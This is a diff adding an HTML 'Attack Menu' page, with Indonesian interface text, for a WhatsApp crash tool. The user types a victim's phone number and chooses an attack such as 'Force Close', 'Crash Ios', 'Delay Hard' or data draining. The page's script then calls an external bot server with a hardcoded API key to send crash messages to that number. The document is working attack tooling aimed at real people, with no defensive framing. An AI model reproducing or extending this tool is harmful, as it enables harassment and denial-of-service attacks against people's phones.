@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Attack Menu</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'monospace', sans-serif;
+    }
+    body {
+  background: url('https://files.catbox.moe/wk7yan.jpg') no-repeat center center fixed;
+  background-size: cover;
+  color: white;
+}
+
+    .topbar {
+      background: #00bfff;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      color: white;
+      font-size: 18px;
+    }
+
+    .menu-icon {
+      font-size: 26px;
+      margin-right: 15px;
+      cursor: pointer;
+    }
+
+    .drawer {
+      position: fixed;
+      top: 0;
+      left: -270px;
+      width: 260px;
+      height: 100%;
+      background-color: #0f0f0f;
+      padding: 20px;
+      transition: left 0.3s ease;
+      z-index: 1001;
+    }
+
+    .drawer.open {
+      left: 0;
+    }
+
+    .drawer img {
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    .drawer h2 {
+      text-align: center;
+      font-size: 20px;
+    }
+
+    .drawer a {
+      display: block;
+      margin: 14px 0;
+      color: white;
+      text-decoration: none;
+      font-size: 16px;
+      padding-left: 6px;
+    }
+
+    .drawer a:hover {
+      color: #00bfff;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      z-index: 1000;
+    }
+
+    .overlay.show {
+      display: block;
+    }
+
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+
+    img.logo {
+      width: 150px;
+      border-radius: 50%;
+      margin: 20px auto;
+    }
+
+    input, .dropdown .selected, button {
+      width: 90%;
+      max-width: 360px;
+      margin: 12px auto;
+      padding: 16px;
+      border-radius: 28px;
+      background: black;
+      font-size: 20px;
+      border: 1px solid red;
+      color: white;
+      box-shadow: 0 0 16px pink;
+      display: block;
+    }
+
+    /* Glow ungu saat klik */
+    input:focus, .dropdown .selected:focus, button:focus {
+      outline: none;
+      border: 1px solid white !important;
+      box-shadow: 0 0 16px white !important;
+    }
+
+    input::placeholder {
+      color: white;
+      opacity: 0.7;
+    }
+
+    .dropdown {
+      position: relative;
+      width: 90%;
+      max-width: 360px;
+      margin: 0 auto 24px; /* Jarak bawah lebih besar sebelum tombol */
+      text-align: left;
+    }
+
+    .dropdown .options {
+      position: absolute;
+      width: 100%;
+      background:white;
+      border-radius: 16px;
+      box-shadow: 0 0 12px red;
+      margin-top: 6px;
+      display: none;
+      z-index: 1000;
+    }
+
+    .dropdown .option {
+      padding: 12px 16px;
+      color: red;
+      border-bottom: 1px solid #222;
+      cursor: pointer;
+    }
+
+    .dropdown .option:last-child {
+      border-bottom: none;
+    }
+
+    .dropdown .option:hover {
+      background-color: white;
+    }
+    
+    .error-toast {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(30, 30, 30, 0.8);
+      backdrop-filter: blur(12px);
+      color: white;
+      padding: 20px 24px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px #00ccff99;
+      width: 90%;
+      max-width: 340px;
+      text-align: left;
+      animation: fadeInCenter 0.3s ease;
+      z-index: 9999;
+    }
+    @keyframes fadeInCenter {
+      from { opacity: 0; transform: translate(-50%, -60%); }
+      to   { opacity: 1; transform: translate(-50%, -50%); }
+    }
+    .error-toast .icon {
+      color: red;
+      font-size: 20px;
+      margin-bottom: 5px;
+    }
+   .error-toast .title {
+      color: red;
+      font-weight: bold;
+      font-size: 16px;
+    }
+   .error-toast .message {
+      margin: 6px 0;
+      font-size: 13px;
+      color: white;
+      white-space: pre-wrap;
+    }
+   .error-toast .tagline {
+      font-size: 11px;
+      opacity: 0.4;
+      font-style: italic;
+    }
+   .error-toast .close {
+      font-size: 12px;
+      color: red;
+      font-weight: white;
+      text-align: right;
+      margin-top: 5px;
+      cursor: pointer;
+    }
+
+    button {
+      background: linear-gradient(to right, red, red);
+      color: white;
+      font-weight: white;
+      border: none;
+      cursor: pointer;
+      transition: 2.3s;
+      box-shadow: 0 0 26px red;
+    }
+
+    hr {
+      width: 80%;
+      border: 1px solid red;
+      margin: 10px auto 20px;
+    }
+  </style>
+</head>
+<!-- Notification Toast -->
+<div id="toastBox" class="error-toast" style="display:none;">
+  <div class="title" id="toastTitle">Success</div>
+  <div class="message" id="toastMessage">Bug berhasil dikirim!</div>
+  <div class="tagline">Creator @Zxyro01</div>
+  <div class="close" onclick="closeToast()">CLOSE</div>
+</div>
+<body>
+
+  <!-- Sidebar / Drawer -->
+  <div class="drawer" id="drawer">
+    <p>Project by @VynxNotDev</p>
+    <a href="dashboard.html">My Info</a>
+    <a href="attack.html">Attack Menu</a>
+  </div>
+  <div class="overlay" id="overlay"></div>
+
+  <!-- Main Content -->
+  <div class="container">
+    <img src="https://files.catbox.moe/ypzaap.jpg" class="logo" alt="Logo">
+    <h2>Select Target & Bug</h2>
+
+    <input type="number" id="target" placeholder="Target number (e.g. +62 812xxxx)">
+
+    <div class="dropdown" id="dropdown">
+      <div class="selected" onclick="toggleDropdown()">Sedot Kuota</div>
+      <div class="options" id="dropdownOptions">
+        <div class="option" onclick="selectOption(this)">Sedot Kuota</div>
+        <div class="option" onclick="selectOption(this)">Force Close</div>
+        <div class="option" onclick="selectOption(this)">Crash Ios</div>
+        <div class="option" onclick="selectOption(this)">Delay Hard</div>
+        <div class="option" onclick="selectOption(this)">Crash Infinity</div>
+      </div>
+    </div>
+
+    <button onclick="sendBug()">SEND BUG</button>
+  </div>
+
+  <!-- Script -->
+  <script>
+    function toggleDropdown() {
+      const options = document.getElementById("dropdownOptions");
+      options.style.display = options.style.display === "block" ? "none" : "block";
+    }
+
+    function selectOption(el) {
+      document.querySelector(".selected").innerText = el.innerText;
+      document.getElementById("dropdownOptions").style.display = "none";
+    }
+
+    function showToast(title, message) {
+      document.getElementById("toastTitle").innerText = title;
+      document.getElementById("toastMessage").innerText = message;
+      document.getElementById("toastBox").style.display = "block";
+    }
+
+function closeToast() {
+  document.getElementById("toastBox").style.display = "none";
+}
+
+async function sendBug() {
+  const number = document.getElementById("target").value.trim();
+  const bugLabel = document.querySelector(".selected").innerText;
+
+  if (!number || !bugLabel) {
+    showToast("🚫 Input Kosong", "Silakan isi target dan jenis bug!");
+    return;
+  }
+
+  let cleaned = number.replace(/\D/g, "");
+  if (cleaned.startsWith("0")) cleaned = "62" + cleaned.slice(1);
+  if (cleaned.startsWith("8")) cleaned = "62" + cleaned;
+  if (!cleaned.startsWith("62")) cleaned = "62" + cleaned;
+
+  const fullId = `${cleaned}@s.whatsapp.net`;
+
+  const bugMap = {
+    "Sedot Kuota": "SedotKuota",
+    "Force Close": "FcBeta",
+    "Crash Ios": "InvisIos",
+    "Delay Hard": "DelayHard",
+    "Crash Infinity": "FcOri"
+  };
+
+  const func = bugMap[bugLabel];
+  if (!func) {
+    showToast("Jenis Bug Tidak Dikenali", bugLabel);
+    return;
+  }
+
+  const key = "apikey_f14041a5b940";
+  let botNumber = null;
+  try {
+    const res = await fetch("http://gyrfehbcdns.jerzzoffc.my.id:2008/listSession");
+    const bots = await res.json();
+    if (!bots.length) throw new Error("Tidak ada bot WhatsApp aktif!");
+    botNumber = bots[Math.floor(Math.random() * bots.length)];
+  } catch (err) {
+    showToast("❌ Gagal mengambil list bot", err.message);
+    return;
+  }
+
+  const sendBugUrl =
+    "http://gyrfehbcdns.jerzzoffc.my.id:2008/sendBug?" +
+    new URLSearchParams({
+      key,
+      func,
+      botNumber,
+      target: fullId,
+    });
+
+  try {
+    const res = await fetch(sendBugUrl);
+    const data = await res.json();
+    if (data.status) {
+      showToast("✅ Bug Terkirim", `Type: ${func}\nTo: ${cleaned}`);
+    } else {
+      showToast("❌ Gagal Kirim Bug", data.message || "Unknown Error");
+    }
+  } catch (err) {
+    showToast("❌ Gagal Mengirim", err.message);
+  }
+}
+
+    // Sidebar logic
+    const drawer = document.getElementById('drawer');
+    const menuToggle = document.getElementById('menuToggle');
+    const overlay = document.getElementById('overlay');
+
+    menuToggle.addEventListener('click', () => {
+      drawer.classList.toggle('open');
+      overlay.classList.toggle('show');
+    });
+
+    overlay.addEventListener('click', () => {
+      drawer.classList.remove('open');
+      overlay.classList.remove('show');
+    });
+  </script>
+</body>
+</html>
